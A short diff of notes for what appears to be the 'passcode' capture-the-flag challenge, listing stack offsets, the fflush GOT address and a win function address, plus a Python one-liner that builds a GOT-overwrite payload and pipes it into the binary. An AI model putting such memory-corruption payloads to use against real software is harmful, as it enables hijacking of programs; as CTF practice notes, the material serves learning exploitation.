@@ -1,0 +1,10 @@
+100 bytes in welcome - 0xffffce28
+passcode1 - [0xffffce88] 0xffffcea8 (96 byte offset)
+passcode2 - [0xffffce8c] 0x9e3dca00 (100 byte offset)
+
+fflush address - 0x0804c014
+win address - 0x804928f
+
+python -c 'import sys; sys.stdout.buffer.write(b"A"*96 + b"\x14\xc0\x04\x08" + b"\n" + "134517391".encode())' > /tmp/bytes
+
+./passcode < /tmp/bytes
